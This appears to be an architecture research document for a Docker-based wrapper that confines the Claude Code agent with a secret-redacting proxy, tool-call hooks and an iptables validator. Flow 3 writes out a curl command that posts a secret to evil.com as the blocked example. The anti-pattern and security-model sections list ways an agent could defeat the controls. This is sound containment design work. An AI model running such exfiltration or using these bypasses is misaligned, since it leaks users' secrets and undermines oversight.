# Architecture Research

**Domain:** Docker-based CLI security isolation wrapper
**Researched:** 2026-04-08
**Confidence:** HIGH (architecture derived from detailed project spec + Docker/networking fundamentals)

## System Overview

```
Host System
 |
 |  docker compose up
 v
+================================================================+
|  Docker Compose Orchestration                                   |
|                                                                 |
|  INTERNAL NETWORK (claude-internal, no internet gateway)        |
|  +----------------------------------------------------------+  |
|  |                                                          |  |
|  |  +-----------------+    +----------------+               |  |
|  |  | claude          |    | validator      |               |  |
|  |  | (Claude Code)   |--->| (Python HTTP   |               |  |
|  |  |                 |    |  + iptables     |               |  |
|  |  | Hooks: pre-     |    |  + SQLite)      |               |  |
|  |  | tool-use.sh     |    | :8088/register |               |  |
|  |  +---------+-------+    +----------------+               |  |
|  |            |                                              |  |
|  |            | ANTHROPIC_BASE_URL=http://proxy:8080         |  |
|  |            v                                              |  |
|  |  +-----------------+                                      |  |
|  |  | proxy           |                                      |  |
|  |  | (Node.js HTTP)  |----+                                 |  |
|  |  | :8080           |    |                                 |  |
|  |  +-----------------+    |                                 |  |
|  |                         |                                 |  |
|  +-------------------------|---------------------------------+  |
|                            |                                    |
|  EXTERNAL NETWORK          |  (claude-external, has gateway)    |
|  +-------------------------|---------------------------------+  |
|  |                         v                                 |  |
|  |              api.anthropic.com                            |  |
|  +-----------------------------------------------------------+  |
+================================================================+
```

### Component Responsibilities

| Component | Responsibility | Implementation | Container |
|-----------|----------------|----------------|-----------|
| **claude** | Runs Claude Code CLI in isolated network namespace; no direct internet | Node.js 20 + `@anthropic-ai/claude-code` npm package | `claude-secure` |
| **proxy** | Intercepts all Claude-to-Anthropic traffic; redacts secrets outbound, restores placeholders inbound | Node.js `http`/`https` stdlib (no framework) | `claude-proxy` |
| **validator** | Registers hook-signed call-IDs; enforces via iptables that only registered calls reach the network | Python stdlib `http.server` + SQLite + iptables | `claude-validator` |
| **hooks** | PreToolUse script that intercepts Bash/WebFetch/WebSearch calls, checks domain whitelist, registers with validator | Bash + jq + uuidgen (read-only mounted) | Runs inside `claude` container |
| **config** | Centralized whitelist (domain-to-secret mapping) and secret values | JSON whitelist + `.env` file (root-owned, read-only) | Mounted into relevant containers |

## Recommended Project Structure

```
claude-secure/
├── docker-compose.yml          # Orchestration: 3 services, 2 networks
├── install.sh                  # Host installer (deps, auth, workspace, CLI shortcut)
│
├── claude/                     # Claude Code container
│   ├── Dockerfile              # FROM node:20-slim, installs claude-code
│   ├── settings.json           # Hook configuration (PreToolUse matcher)
│   └── hooks/
│       └── pre-tool-use.sh     # Domain check + validator registration
│
├── proxy/                      # Anthropic proxy container
│   ├── Dockerfile              # FROM node:20-slim
│   └── proxy.js                # HTTP proxy with secret redaction/restoration
│
├── validator/                  # Call validator container
│   ├── Dockerfile              # FROM python:3.11-slim + iptables
│   └── validator.py            # HTTP registration + SQLite + iptables rules
│
├── config/                     # Shared configuration (root-owned, read-only)
│   ├── whitelist.json          # Secret-to-domain mapping + readonly domains
│   └── .env                    # Actual secret values (chmod 400)
│
└── tests/                      # Integration tests
    ├── test-blocked-call.sh    # Verify blocked scenarios
    ├── test-allowed-call.sh    # Verify allowed scenarios
    └── test-secret-redaction.sh # Verify proxy redaction
```

### Structure Rationale

- **One directory per container:** Each service (`claude/`, `proxy/`, `validator/`) is self-contained with its own Dockerfile. This maps directly to Docker Compose build contexts and keeps concerns separated.
- **Config at top level:** Shared configuration lives in `config/` and is volume-mounted read-only into containers that need it. Root ownership prevents Claude from modifying security policies.
- **Hooks inside claude/:** Although hooks are mounted read-only at runtime, they live in the `claude/` build context because they execute inside that container. The Dockerfile copies them and sets `chmod 555`.

## Architectural Patterns

### Pattern 1: Dual-Network Isolation

**What:** Docker Compose defines two networks: `claude-internal` (marked `internal: true`, no default gateway to the host/internet) and `claude-external` (standard bridge with internet access). The claude and validator containers attach only to `internal`. The proxy container bridges both networks.

**When to use:** Whenever a container must communicate with peers but must not reach the internet directly. Docker's `internal: true` network flag removes the default gateway, making direct internet access impossible even if the container tries.

**Trade-offs:**
- PRO: Network isolation is enforced at the Docker daemon level, not by application code. Even if the claude process is compromised, it cannot reach the internet.
- PRO: No iptables rules needed on the host to block the claude container.
- CON: The proxy becomes a single point of failure -- if proxy is down, claude cannot reach Anthropic at all. This is acceptable (fail-closed is the desired behavior).
- CON: DNS resolution inside the internal network is limited to container names. External DNS queries from the claude container will fail, which is intentional.

**Key configuration:**
```yaml
networks:
  claude-internal:
    internal: true       # No internet gateway
  claude-external: {}    # Standard bridge, internet access

services:
  claude:
    networks: [claude-internal]     # Isolated
  proxy:
    networks: [claude-internal, claude-external]  # Bridges both
  validator:
    networks: [claude-internal]     # Isolated
```

### Pattern 2: Hook-Based Tool Interception

**What:** Claude Code's `PreToolUse` hook mechanism invokes a shell script before every matching tool call. The script receives tool name and input as JSON on stdin, and uses its exit code to allow (0), block (2), or error. The hook is stateless -- invoked fresh each time, reads config on every call.

**When to use:** When you need to intercept and gate CLI tool calls without modifying the CLI tool itself. The hook pattern is Claude Code-native, requires no monkey-patching.

**Trade-offs:**
- PRO: No modification to Claude Code source. Uses official hook API.
- PRO: Stateless per-invocation means whitelist changes take effect immediately.
- CON: Hook runs in the same container as Claude Code. If Claude could overwrite the hook script, security is bypassed. Mitigation: root ownership + `chmod 555` + read-only volume mount.
- CON: Hook cannot intercept what Claude sends to Anthropic via the normal conversation path (e.g., file contents read into context). That is the proxy's job.

**Exit code contract:**
```
Exit 0  = allow the tool call
Exit 2  = block the tool call (Claude sees the block message on stderr)
Exit 1  = error (tool call is blocked, error is reported)
```

### Pattern 3: Transparent Reverse Proxy with Bidirectional Secret Substitution

**What:** Claude Code is configured with `ANTHROPIC_BASE_URL=http://proxy:8080` so all Anthropic API requests route through the proxy. The proxy: (1) reads secret values from `.env` on every request, (2) replaces real secret values with placeholders in the outbound request body, (3) forwards to `api.anthropic.com`, (4) replaces placeholders back to real values in the response body.

**When to use:** When you need to sanitize data flowing between a client and an API without the client being aware. The bidirectional substitution ensures Claude can use secrets in tool calls (they are restored from placeholders in responses) while Anthropic never sees the real values.

**Trade-offs:**
- PRO: Claude Code requires zero modifications. It thinks it is talking to Anthropic directly.
- PRO: Fresh config reload on every request means no restart needed after whitelist changes.
- CON: Buffered mode (read full request, process, forward) adds latency. Not suitable for streaming SSE in Phase 1.
- CON: String replacement is fragile if secrets appear in unexpected encodings (base64, URL-encoded). Phase 2 should add encoding-aware detection.
- CON: Large request/response bodies consume memory. For typical Claude Code usage, this is not a concern (messages are text, not binary blobs).

### Pattern 4: HTTP-Registered iptables Enforcement

**What:** The validator container runs two services: (1) an HTTP server on `:8088` that accepts call registration from the hook (receives call-ID, domain, PID, expiry), storing them in SQLite, and (2) iptables rules that block outbound traffic from the claude container unless a valid call-ID exists. The hook registers a call-ID before allowing a tool call. The validator checks for a valid, unexpired, unused call-ID for the target domain before allowing the packet through.

**When to use:** When NFQUEUE/scapy kernel-level packet inspection is not available (e.g., WSL2 without kernel modules). The HTTP registration + iptables approach achieves equivalent validation without kernel dependencies.

**Trade-offs:**
- PRO: No kernel module dependencies. Works on WSL2 and standard Linux.
- PRO: SQLite is zero-config, single-file, and provides ACID guarantees for the call registry.
- CON: The validator container needs `NET_ADMIN` capability for iptables management.
- CON: Call-IDs are time-limited (10 seconds) and single-use, creating a tight coupling between hook execution timing and actual network call timing. If Claude Code takes >10 seconds between hook approval and actual execution, the call fails. This is acceptable for security purposes.

## Data Flow

### Flow 1: Claude Makes a Tool Call (Happy Path -- Whitelisted Domain)

```
Claude Code (inside claude container)
    |
    | Claude decides to run: Bash("curl https://api.github.com/repos/...")
    v
PreToolUse Hook (pre-tool-use.sh)
    |
    | 1. Parse tool input JSON from stdin
    | 2. Extract target URL -> api.github.com
    | 3. Check whitelist.json -> api.github.com IS whitelisted
    | 4. Check for file refs containing secrets -> none found
    | 5. Generate call-ID (uuidgen)
    | 6. POST to http://validator:8088/register
    |    {id: "uuid", domain: "api.github.com", pid: "$$", expires: now+10s}
    | 7. Validator stores in SQLite, returns 200
    | 8. Exit 0 (allow)
    v
Claude Code executes the tool call
    |
    | curl https://api.github.com/repos/...
    | (routed through validator's iptables rules)
    v
Validator (iptables check)
    |
    | 1. Look up call-ID for api.github.com in SQLite
    | 2. Found valid, unexpired, unused entry
    | 3. Mark call-ID as used
    | 4. Allow packet through
    v
api.github.com (via claude-external network through proxy or direct)
```

### Flow 2: Claude Talks to Anthropic (Secret Redaction)

```
Claude Code
    |
    | POST http://proxy:8080/v1/messages
    | Body contains: "The GitHub token is ghp_xxxxxxxxxxxxxxxxxxxx"
    v
Proxy (proxy.js)
    |
    | 1. Buffer full request body
    | 2. Load secrets from .env + whitelist.json
    | 3. Build substitution map: ghp_xxxx... -> PLACEHOLDER_GITHUB
    | 4. Replace all occurrences in request body
    | 5. Forward to https://api.anthropic.com/v1/messages
    |    Body now contains: "The GitHub token is PLACEHOLDER_GITHUB"
    v
api.anthropic.com
    |
    | Response: "Use PLACEHOLDER_GITHUB in the Authorization header"
    v
Proxy (proxy.js)
    |
    | 1. Buffer full response body
    | 2. Reverse substitution: PLACEHOLDER_GITHUB -> ghp_xxxx...
    | 3. Return to Claude Code
    v
Claude Code
    | Sees: "Use ghp_xxxxxxxxxxxxxxxxxxxx in the Authorization header"
    | Claude can now use the real token in tool calls
```

### Flow 3: Claude Makes a Tool Call (Blocked -- Non-Whitelisted Domain with Payload)

```
Claude Code
    |
    | Bash("curl -X POST -d 'secret=foo' https://evil.com/exfil")
    v
PreToolUse Hook
    |
    | 1. Extract URL -> evil.com
    | 2. Check whitelist -> NOT whitelisted
    | 3. Check for payload -> has -X POST -d (payload detected)
    | 4. Log: "BLOCKED: Payload to non-whitelisted domain evil.com"
    | 5. stderr: "Blocked: Payload not allowed to non-whitelisted domain evil.com"
    | 6. Exit 2 (block)
    v
Claude Code sees block message, does not execute the call
```

### Flow 4: Non-Whitelisted Domain, Read-Only (Allowed Without Signing)

```
Claude Code
    |
    | WebFetch("https://stackoverflow.com/questions/12345")
    v
PreToolUse Hook
    |
    | 1. Extract URL -> stackoverflow.com
    | 2. Check whitelist -> NOT in secrets whitelist
    | 3. Check for payload -> no payload (GET request)
    | 4. Log: "ALLOWED (read-only): stackoverflow.com"
    | 5. Exit 0 (allow, but NO call-ID registered)
    v
Claude Code executes the call
    |
    | (Note: iptables must allow read-only traffic to non-whitelisted
    |  domains, or readonly_domains must be handled separately)
```

### Key Data Flows

1. **Secret lifecycle:** Secrets live in `config/.env` (host) -> mounted read-only into proxy and validator containers -> proxy reads on each request -> redacted in outbound, restored in inbound. Claude never sees the `.env` file directly.

2. **Call-ID lifecycle:** Generated by hook (uuidgen) -> registered via HTTP POST to validator -> stored in SQLite with 10-second TTL -> consumed (marked `used=1`) on first matching outbound connection -> expired entries cleaned up every 60 seconds.

3. **Configuration lifecycle:** `whitelist.json` is read fresh on every hook invocation and every proxy request. Changes take effect immediately without container restarts.

## Integration Points

### External Services

| Service | Integration Pattern | Notes |
|---------|---------------------|-------|
| api.anthropic.com | HTTP/HTTPS via proxy container | Only the proxy reaches Anthropic. Claude Code's `ANTHROPIC_BASE_URL` is overridden to point to the proxy. |
| Whitelisted APIs (GitHub, Stripe, etc.) | Direct HTTPS from claude container via validator-gated iptables | Hook registers call-ID, validator allows matching outbound connections. |
| Read-only domains (docs, StackOverflow) | Direct HTTPS from claude container | GET-only, no payload. Must be handled in iptables rules (allow or use readonly_domains list). |

### Internal Boundaries

| Boundary | Communication | Protocol | Notes |
|----------|---------------|----------|-------|
| claude -> proxy | HTTP (port 8080) | Proxy receives all Anthropic API traffic | Via `ANTHROPIC_BASE_URL` env var override |
| claude (hook) -> validator | HTTP POST (port 8088) | `/register` endpoint for call-ID registration | Hook sends JSON payload with call-ID, domain, PID, expiry |
| validator -> iptables | Local system calls | `iptables` commands from within validator container | Requires `NET_ADMIN` capability |
| host -> containers | Docker volumes (read-only mounts) | Config, hooks, secrets mounted into containers | Root-owned files prevent modification from inside containers |

## Anti-Patterns

### Anti-Pattern 1: Fail-Open on Validator Errors

**What people do:** If the validator HTTP server is unreachable or returns an error, allow the tool call anyway to avoid blocking the user.
**Why it's wrong:** An attacker (or a bug) that crashes the validator gains unrestricted network access. The entire security model collapses.
**Do this instead:** Fail-closed. If the hook cannot register with the validator, exit 2 (block). If the validator cannot check iptables, drop the packet. User restarts the service to recover.

### Anti-Pattern 2: Storing Secrets in Container Environment Variables

**What people do:** Pass secrets via Docker environment variables (visible in `docker inspect`, process listing, `/proc/*/environ`).
**Why it's wrong:** Claude Code runs inside the container and could read `/proc/self/environ` or the environment directly, exposing secrets to the LLM context.
**Do this instead:** Secrets live only in `config/.env` mounted read-only into proxy/validator. The claude container gets only `ANTHROPIC_BASE_URL` and auth tokens (which the proxy handles). The `ANTHROPIC_API_KEY` in the claude container is a dummy or the user's own key -- the proxy replaces it with the real one when forwarding.

### Anti-Pattern 3: Mutable Hook Scripts

**What people do:** Mount hook scripts as regular volumes, owned by the container user.
**Why it's wrong:** Claude Code could modify the hook script to skip validation, register fake call-IDs, or disable blocking entirely.
**Do this instead:** Hooks are root-owned (`chmod 555`), mounted read-only (`:ro`), and the container drops all capabilities (`cap_drop: ALL`) with `no-new-privileges: true`. Claude can execute hooks but cannot modify them.

### Anti-Pattern 4: Streaming Proxy Without Full-Body Inspection

**What people do:** Forward SSE chunks as they arrive for lower latency, performing string replacement on each chunk.
**Why it's wrong:** A secret value could be split across two chunks (e.g., `ghp_xxxx` in one chunk, `xxxxxxxx` in the next). Per-chunk replacement would miss it.
**Do this instead:** Phase 1 uses buffered mode (read entire body, replace, forward). Phase 2 streaming must implement a sliding window or buffer-then-flush approach with overlap detection.

### Anti-Pattern 5: Single SQLite Connection Across Threads

**What people do:** Share one `sqlite3.Connection` across the HTTP server thread and the cleanup thread.
**Why it's wrong:** SQLite connections are not thread-safe by default. Concurrent writes cause `database is locked` errors.
**Do this instead:** Create a new connection per request/operation, or use `check_same_thread=False` with a threading lock around all database operations.

## Build Order (Dependency Graph)

The components have clear dependency ordering based on what needs to exist for other parts to function:

```
Phase 1: Foundation
  Step 1: Docker Compose + Networks (claude-internal, claude-external)
           No dependencies. This is the infrastructure skeleton.

  Step 2: Validator container (Python HTTP + SQLite + iptables)
           Depends on: networks exist
           Why first: both hook and proxy need validator to be running.
           Can be tested independently with curl.

  Step 3: Proxy container (Node.js HTTP with secret redaction)
           Depends on: networks exist, config/whitelist.json, config/.env
           Why second: Claude needs proxy to talk to Anthropic.
           Can be tested independently with curl against a mock upstream.

  Step 4: Claude container + hooks
           Depends on: proxy running, validator running, hooks written
           Why last: it consumes both proxy and validator services.
           Hooks can be developed and unit-tested before containerization.

  Step 5: Integration testing
           Depends on: all containers running
           End-to-end tests for blocked/allowed/redacted scenarios.

  Step 6: Installer script
           Depends on: all containers working together
           Wraps the setup into a single command.
```

### Build Order Rationale

- **Validator first** because it is the most self-contained component (HTTP server + SQLite) and can be tested in isolation. It has no upstream dependencies.
- **Proxy second** because it needs only outbound HTTPS access (which it has via `claude-external` network) and config files. Testing it requires only curl and a valid Anthropic API key.
- **Claude container last** because it depends on both proxy and validator being functional. The hook scripts can be developed alongside the validator (they call its API), but the full integration only works when all three services are up.
- **Installer last** because it wraps a working system. Building installer before the system works leads to premature abstraction and constant installer rework.

## Scaling Considerations

This system is designed for a single developer workstation. Scaling is not a primary concern, but these are the practical limits:

| Concern | Single User (target) | Multiple Projects |
|---------|---------------------|-------------------|
| Container count | 3 containers, ~200MB total memory | One set per project (Phase 3) |
| SQLite throughput | <1 write/second (call registration) | No issue even with 10 projects |
| Proxy latency | ~50-200ms overhead per Anthropic call (buffered mode) | Acceptable for interactive CLI use |
| iptables rules | <10 rules | Could grow with many whitelisted domains; manageable |

### Practical Limits

1. **First bottleneck:** Proxy buffering latency on large responses. Anthropic responses for code generation can be 50KB+. Buffering adds latency proportional to response size. For Phase 1 this is acceptable. Phase 2 streaming addresses it.
2. **Second bottleneck:** SQLite write contention if multiple tool calls fire rapidly. Unlikely with single-user CLI usage, but the cleanup thread and registration handler should use separate connections with proper locking.

## Security Model Summary

```
Layer    | What it prevents                          | Bypass scenario
---------|-------------------------------------------|---------------------------
Docker   | Direct internet from claude container     | Container escape (Docker vuln)
Hook     | Unauthorized tool calls to external URLs   | Hook script modification (mitigated by root ownership)
Proxy    | Secrets reaching Anthropic servers         | Secret in unexpected encoding, split across chunks
Validator| Network calls without hook authorization   | Validator crash (fail-closed mitigates)
iptables | All unauthorized outbound from claude      | NET_ADMIN escalation in claude container (mitigated by cap_drop: ALL)
```

## Sources

- Docker Compose networking documentation: `internal: true` network flag removes the default gateway, preventing internet access (Docker official docs, well-established behavior since Compose v2)
- Claude Code hooks: PreToolUse hook mechanism receives tool name and input as JSON on stdin, uses exit codes 0/1/2 for allow/error/block (Anthropic Claude Code documentation)
- SQLite threading: connections are not thread-safe unless `check_same_thread=False` is used with external locking (SQLite documentation)
- iptables in Docker: containers with `NET_ADMIN` capability can manage their own iptables rules within their network namespace (Docker security documentation)
- Project specification: `/home/igor9000/claude-secure/Project.md` (primary architecture source)

---
*Architecture research for: Docker-based CLI security isolation*
*Researched: 2026-04-08*
